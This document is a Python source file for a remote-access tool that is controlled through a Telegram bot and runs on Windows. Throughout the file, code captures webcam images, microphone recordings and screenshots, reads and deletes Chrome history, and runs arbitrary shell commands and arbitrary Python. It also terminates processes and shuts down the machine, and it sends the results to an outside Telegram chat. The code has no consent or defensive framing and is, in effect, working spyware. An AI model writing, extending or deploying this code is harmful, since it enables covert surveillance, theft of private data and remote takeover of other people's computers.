from socket import create_connection as socket_create_connection
from time import sleep as time_sleep


def check_modules():
    import pkg_resources
    cntpkg = 0
    packages = ['opencv-python==4.6.0.66', 'Pillow==9.1.1', 'sounddevice==0.4.4', 'PyAutoGUI==0.9.53',
                'wavio==0.0.4', 'requests==2.28.0', 'numpy==1.23.0', 'pyTelegramBotAPI', 'psutil==5.9.1']
    installed_packages = pkg_resources.working_set

    for package in packages:
        if(package in installed_packages):
            cntpkg += 1
    if cntpkg == len(packages):
        return True
    else:
        return False


def connected():
    try:
        socket_create_connection(("www.google.com", 80))
        return True
    except:
        return False


while True:
    if connected():
        if(check_modules):
            from installmodules import *
        from os import remove as os_remove, path as os_path, system as os_system, popen as os_popen, listdir as os_listdir
        from re import match as re_match, compile as re_compile
        from random import randint as random_randint
        from ctypes import windll as ctypes_windll
        from getpass import getuser as getpass_getuser
        from cv2 import VideoCapture as cv2_VideoCapture, imwrite as cv2_imwrite
        from pyautogui import screenshot as pyautogui_screenshot, alert as pyautogui_alert
        from sounddevice import rec as sounddevice_rec, wait as sounddevice_wait
        from webbrowser import open as webbrowser_open
        from wavio import write as wavio_write
        from PIL import *
        from platform import node as platform_node, processor as platform_processor, system as platform_system, release as platform_release, version as platform_version, machine as platform_machine
        from telebot import TeleBot as telebot_TeleBot, types as telebot_types
        from configure import *
        from config import TOKEN as config_TOKEN, CHAT_ID as config_CHAT_ID
        from sqlite3 import connect as sqlite3_connect
        from user_data import username_in_users as user_data_username_in_users, username as user_data_username
        from ip_and_location import location as ip_and_location_location
        from psutil import process_iter as psutil_process_iter, Process as psutil_Process
        from subprocess import Popen as subprocess_Popen, PIPE as subprocess_PIPE
        from tkinter.simpledialog import askstring
        from tempfile import gettempdir as tempfile_gettempdir
        bot = telebot_TeleBot(config_TOKEN)
        bot.send_message(config_CHAT_ID, f"{user_data_username} is online ")
        btns = [["Specifications ⚙", "IP Address🌎"],
                ["WebCam 📷", "Record audio 🎤", 'Screenshot 👀'],
                ['Running apps 📱', 'Close app 📱'], ['Message ✉', "Input 📩"],
                ['Open URL 🌐', 'Cmd 💻', "Python 🐍"],
                ['Wallpaper 🖼', 'Chrome history ⌚', "Delete Chrome History 🗑️"],
                ['Lock Screen 🔒', 'Hibernate 💤', "Logout 🗑️"],
                ['Shutdown 🔌', "Restart 🔄"]
                ]
        text_commands = []
        for btn in btns:
            for btn_name in btn:
                text_commands.append(btn_name)

        @ bot.message_handler(commands=["start", "help"])
        def start(message):
            if str(message.chat.id) == config_CHAT_ID:
                rmk = telebot_types.ReplyKeyboardMarkup(resize_keyboard=True)
                for i in range(len(btns)):
                    rmk.row(*btns[i])
                bot.send_message(
                    message.chat.id, """Welcome to the bot!""", reply_markup=rmk)
            else:
                bot.send_message(
                    message.chat.id, 'Hello ! You are not user of this computer !')

        @ bot.message_handler(content_types=["text"])
        def commands_handler(message):
            if str(message.chat.id) == config_CHAT_ID:
                if is_url(message.text):
                    webbrowser_open(message.text)
                else:
                    match message.text:
                        case "Specifications ⚙" | '/specs':
                            specifications(message)
                        case "IP Address🌎" | '/ip':
                            ip_address(message)
                        case "WebCam 📷" | '/webcam':
                            webcam(message)
                        case "Record audio 🎤" | '/record':
                            _record_audio(message)
                        case "Screenshot 👀" | '/screenshot':
                            screenshot(message)
                        case "Running apps 📱" | '/running':
                            running_apps_(message)
                        case "Close app 📱" | '/close':
                            _close_app(message)
                        case "Message ✉" | '/message':
                            _message(message)
                        case "Input 📩" | '/input':
                            _chat(message)
                        case "Open URL 🌐" | '/url':
                            _open_url(message)
                        case "Cmd 💻" | '/cmd':
                            _cmd(message)
                        case 'Python 🐍' | '/python':
                            _py(message)
                        case "Chrome history ⌚" | '/chrome':
                            chrome_history(message)
                        case "Delete Chrome History 🗑️" | '/delete_chrome':
                            delete_chrome_history(message)
                        case "Wallpaper 🖼" | '/wallpaper':
                            wallpaper(message)
                        case "Lock Screen 🔒" | '/lock':
                            lock(message)
                        case "Hibernate 💤" | '/hibernate':
                            hibernate(message)
                        case "Shutdown 🔌" | '/shutdown':
                            shutdown(message)
                        case "Restart 🔄" | '/restart':
                            restart(message)
                        case "Logout 🗑️" | '/logout':
                            logout(message)
                        case default:
                            open_url(message)

        def specifications(message):
            banner = f"""
            Name PC: {platform_node()}
            Processor: {platform_processor()}
            System: {platform_system()}
            Release: {platform_release()}
            Version: {platform_version()}
            Machine: {platform_machine()}
            Username :{getpass_getuser()}
            """
            bot.send_message(message.chat.id, banner)

        def ip_address(message):
            bot.send_message(
                message.chat.id, ip_and_location_location, parse_mode="Markdown")

        def webcam(message):
            try:
                filename = tempfile_gettempdir()+"\\cam"+str(
                    random_randint(1, 99999999))+".jpg"
                cap = cv2_VideoCapture(0)
                for i in range(10):
                    cap.read()
                ret, frame = cap.read()
                cv2_imwrite(filename, frame)
                cap.release()
                with open(filename, "rb") as img:
                    bot.send_photo(message.chat.id, img)
                os_remove(filename)
            except:
                bot.send_message(
                    message.chat.id, "Another program is using the camera")

        def _record_audio(message):
            msg = bot.send_message(message.chat.id, "Enter duration :")
            bot.register_next_step_handler(msg, record_audio)

        def record_audio(duration):
            if duration.text in text_commands:
                commands_handler(duration)
            else:
                try:
                    message = duration
                    freq = 44100
                    duration = int(float(duration.text))
                    bot.send_message(message.chat.id, "Started recording for " +
                                     str(duration) + " seconds")
                    filepath = tempfile_gettempdir()+"\\rec"+str(
                        random_randint(1, 1000))+".wav"
                    recording = sounddevice_rec(int(duration * freq),
                                                samplerate=freq, channels=2)
                    sounddevice_wait()
                    wavio_write(filepath, recording, freq, sampwidth=2)
                    bot.send_message(message.chat.id, "Recording finished ")
                    with open(filepath, "rb") as rec:
                        bot.send_document(message.chat.id, document=rec)
                    os_remove(filepath)
                except:
                    bot.send_message(
                        message.chat.id, "Send valid integer value or another program is using the microphone")

        def screenshot(message):
            filename = tempfile_gettempdir()+"\\screen"+str(
                random_randint(1, 9999999))+".jpg"
            pyautogui_screenshot(filename)
            with open(filename, "rb") as img:
                bot.send_document(message.chat.id, document=img)

            os_remove(filename)

        def _message(message):
            msg = bot.send_message(message.chat.id, "Enter message :")
            bot.register_next_step_handler(msg, message_)

        def message_(message):
            try:
                if message.text not in text_commands:
                    pyautogui_alert(message.text, "Message")
                else:
                    commands_handler(message)
            except:
                bot.send_message(message.chat.id, "Something went wrong...")

        def _chat(message):
            msg = bot.send_message(message.chat.id, "Enter question :")
            if msg.text not in text_commands:
                bot.register_next_step_handler(msg, chat)
            else:
                commands_handler(message)

        def chat(message):
            try:
                if message.text not in text_commands:
                    bot.send_message(
                        message.chat.id, askstring('Chat', message.text))
                else:
                    commands_handler(message)
            except:
                bot.send_message(
                    message.chat.id, "User closed input window...")

        def wallpaper(message):
            msg = bot.send_message(message.chat.id, "Send me photo :")
            bot.register_next_step_handler(msg, set_wallpaper)

        @ bot.message_handler(content_types=["photo"])
        def set_wallpaper(message):
            if str(message.chat.id) == config_CHAT_ID and message.photo is not None:
                file = bot.get_file(message.photo[-1].file_id)
                filepath = tempfile_gettempdir()+"\\wall"+str(
                    random_randint(1, 1000))+".jpg"
                download_file = bot.download_file(file.file_path)
                with open(filepath, "wb") as img:
                    img.write(download_file)
                path = os_path.abspath(filepath)
                ctypes_windll.user32.SystemParametersInfoW(20, 0, path, 0)
                bot.send_message(message.chat.id, "Wallpaper successfully set")
                time_sleep(4)
                os_remove(filepath)
            elif message.text in text_commands:
                commands_handler(message)
            else:
                bot.send_message(message.chat.id, "Something went wrong...")

        @ bot.message_handler(content_types=["document"])
        def download_file_to_downloads(message):
            if str(message.chat.id) == config_CHAT_ID:
                ext = message.document.file_name.split('.')[-1]
                files = []
                for file in os_listdir(f"C:\\Users\\{user_data_username_in_users}\\Downloads\\"):
                    files.append(file)
                file = bot.get_file(message.document.file_id)
                if message.document.file_name not in files:
                    filepath = f"C:\\Users\\{user_data_username_in_users}\\Downloads\\"+accumulator(
                        message.document.file_name.split('.')[0:-1])+"_"+str(random_randint(1, 1000))+"."+ext
                else:
                    filepath = f"C:\\Users\\{user_data_username_in_users}\\Downloads\\"+accumulator(
                        message.document.file_name.split('.')[0:-1])+"."+ext
                download_file = bot.download_file(file.file_path)
                with open(filepath, "wb") as document:
                    document.write(download_file)
                if message.document.file_name.split('.')[-1] in ['png', 'jpeg', 'jpg']:
                    path = os_path.abspath(filepath)
                    ctypes_windll.user32.SystemParametersInfoW(20, 0, path, 0)

                    bot.send_message(
                        message.chat.id, "Photo downloaded to downloads folder and  Wallpaper successfully set !")
                else:
                    bot.send_message(
                        message.chat.id, "Document downloaded to downloads folder !")

        def accumulator(list):
            a = ""
            for item in list:
                a += str(item)
            return a

        def running_apps_(message):
            cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
            proc = subprocess_Popen(cmd, shell=True, stdout=subprocess_PIPE)
            apps = []
            for line in proc.stdout:
                if line.rstrip():
                    apps.append(line.decode().rstrip())
            apps.remove('Description')
            apps.remove('-----------')
            if len(apps) != 0:
                for app in apps:
                    bot.send_message(message.chat.id, app)
            else:
                bot.send_message(message.chat.id, 'No running apps')
        def __close_app(app_name):
            running_apps = psutil_process_iter(['pid', 'name'])
            found = False
            for app in running_apps:
                sys_app = app.info.get('name').split('.')[0].lower()
                if sys_app in app_name.split() or app_name in sys_app:
                    pid = app.info.get('pid')
                    try:
                        app_pid = psutil_Process(pid)
                        app_pid.terminate()
                        found = True
                    except:
                        pass
                else:
                    pass
            if not found:
                return app_name + " is not running right now."
            else:
                return  app_name+' successfully closed.'
        def _close_app(message):
            msg = bot.send_message(message.chat.id, "Enter app name :")
            bot.register_next_step_handler(msg, close_app)

        def close_app(message):
            if message.text in text_commands:
                    commands_handler(message)
            else:
                app_name = message.text.lower()
                running_apps = psutil_process_iter(['pid', 'name'])
                found = False
                for app in running_apps:
                    sys_app = app.info.get('name').split('.')[0].lower()
                    if sys_app in app_name.split() or app_name in sys_app:
                        pid = app.info.get('pid')
                        try:
                            app_pid = psutil_Process(pid)
                            app_pid.terminate()
                            found = True
                        except:
                            pass
                    else:
                        pass
                if not found:
                    bot.send_message(message.chat.id, app_name +
                                     " is not running right now.")
                else:
                    bot.send_message(
                        message.chat.id, app_name+' successfully closed.')


        def lock(message):
            ctypes_windll.user32.LockWorkStation()
            bot.send_message(message.chat.id, "Locked")

        def shutdown(message):
            bot.send_message(message.chat.id, "Shutting down...")
            os_system("shutdown -s -t 0")

        def hibernate(message):
            bot.send_message(message.chat.id, "Hibernating...")
            os_system("shutdown /h")

        def restart(message):
            bot.send_message(message.chat.id, "Restarting...")
            os_system("shutdown /r /t 0")

        def logout(message):
            bot.send_message(message.chat.id, "Logging off...")
            os_system("shutdown /l")

        def _open_url(message):
            msg = bot.send_message(message.chat.id, "Enter url :")
            bot.register_next_step_handler(msg, open_url)

        def is_url(url):

            url_reg_exp = r"""(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’])|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)\b/?(?!@)))"""
            return bool(re_match(url_reg_exp, url))

        def open_url(message):
            if message.text not in text_commands:
                if is_url(message.text):
                    webbrowser_open(message.text)
                    bot.send_message(message.chat.id, "Url opened")
                else:
                    if message.text not in text_commands:
                        webbrowser_open(
                            'https://www.google.com/search?q=' + message.text)
                        bot.send_message(
                            message.chat.id, "Sent query for google...")
                    else:
                        bot.send_message(message.chat.id, "Query canceled")
            else:
                commands_handler(message)

        def _cmd(message):
            msg = bot.send_message(message.chat.id, "Enter command :")
            bot.register_next_step_handler(msg, cmd)

        def cmd(message):
            if message.text not in text_commands:
                try:
                    os_popen(message.text).read()
                    bot.send_message(
                        message.chat.id, "Commands completed succesfully.")
                except:
                    bot.send_message(
                        message.chat.id, "Something went wrong...")
            else:
                commands_handler(message)

        def _py(message):
            msg = bot.send_message(message.chat.id, "Enter command :")
            bot.register_next_step_handler(msg, py)

        def py(message):
            if message.text not in text_commands:
                try:
                    exec(message.text)
                    bot.send_message(
                        message.chat.id, "Commands completed succesfully.")
                except:
                    bot.send_message(
                        message.chat.id, "Something went wrong...")
            else:
                commands_handler(message)

        def chrome_history(message):
            try:
                conn_str = 'C:/Users/'+user_data_username_in_users + \
                    '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
                con = sqlite3_connect(conn_str)
                cursor = con.cursor()
                cursor.execute("SELECT url FROM urls")
                urls_ = cursor.fetchall()
                urls = []
                for url in urls_:
                    urls.append(url[0])
                if len(urls) != 0:
                    for url in urls:
                        bot.send_message(message.chat.id, url)
                else:
                    bot.send_message(message.chat.id, 'History is empty...')
            except:
                bot.send_message(
                    message.chat.id, "Chrome history database is locked . Try to close chrome and try again.")

        def delete_chrome_history(message):
            try:
                conn = sqlite3_connect('c:/Users/'+user_data_username_in_users +
                                       '/AppData/Local/Google/Chrome/User Data/Default/History')
                c = conn.cursor()
                domainPattern = re_compile(r"https?://([^/]+)/")
                domains = {}
                result = True
                id = 0
                while result:
                    result = False
                    ids = []
                    for row in c.execute('SELECT id, url, title FROM urls WHERE id > ? LIMIT 1000', (id,)):
                        result = True
                        match = domainPattern.search(row[1])
                        id = row[0]
                        if match:
                            domain = match.group(1)
                            domains[domain] = domains.get(domain, 0) + 1
                            ids.append((id,))

                    c.executemany('DELETE FROM urls WHERE id=?', ids)
                    conn.commit()
                    # bot.send_message(message.chat.id,domains)
                bot.send_message(message.chat.id, "History deleted")
            except:
                bot.send_message(
                    message.chat.id, "Chrome history database is locked . Try to close chrome and try again.")
        def edge_history(message):
            try:
                conn_str = 'C:/Users/'+user_data_username_in_users + \
                    '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
                con = sqlite3_connect(conn_str)
                cursor = con.cursor()
                cursor.execute("SELECT url FROM urls")
                urls_ = cursor.fetchall()
                urls = []
                for url in urls_:
                    urls.append(url[0])
                if len(urls) != 0:
                    for url in urls:
                        bot.send_message(message.chat.id, url)
                else:
                    bot.send_message(message.chat.id, 'History is empty...')
            except:
                bot.send_message(
                    message.chat.id, "Edge history database is locked . Try to close chrome and try again.")
        def connected():
            try:
                socket_create_connection(("www.google.com", 80))
                return True
            except:
                return False

        if __name__ == '__main__':
            bot.infinity_polling(1000)
        break
    time_sleep(1)
